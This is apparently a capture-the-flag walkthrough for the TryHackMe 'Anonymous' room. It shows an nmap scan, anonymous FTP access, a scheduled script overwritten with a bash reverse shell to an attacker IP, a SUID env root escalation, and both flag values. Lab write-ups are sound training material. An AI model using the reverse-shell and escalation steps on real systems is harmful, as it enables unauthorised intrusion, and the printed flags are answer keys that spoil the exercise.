###### Not the hacking group
Room: https://tryhackme.com/room/anonymous
##

**sudo nmap** -sS --script=vuln -sV -T5 -vv xx.xx.xxx.xx
```
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.0.8 or later
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On port 21, we see FTP running. Tried to login Anonymously and it worked.  
```
150 Here comes the directory listing.
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         1290 Oct 10 20:10 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt
```

**content of clean.sh**
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```

We can use **append** to upload an updated version of clean.sh. 

**the updated version of clean.sh**
```
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        sh -i >& /dev/tcp/ATTACKIN_MACHINE_IP/8888 0>&1
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
Set up a listener.We can try to download a file again from ftp or wait.  
After some time, a connection is established, granting us a reverse shell.  

**First flag, content of user.txt** **[1]**
> 90d6f992585815ff991e68748c414740


**find** / -user root -perm -4000 -print 2>/dev/null  
We see that we use the **/usr/bin/env** to escalate our privileges with ease.  

According to [GTFOBins](https://gtfobins.github.io/gtfobins/env/#sudo), we can use **/usr/bin/env /bin/sh -p** to escalate our privileges to root.  

**Second flag, content of /root/root.txt** **[2]**
> 4d930091c31a622a7ed10f27999af363
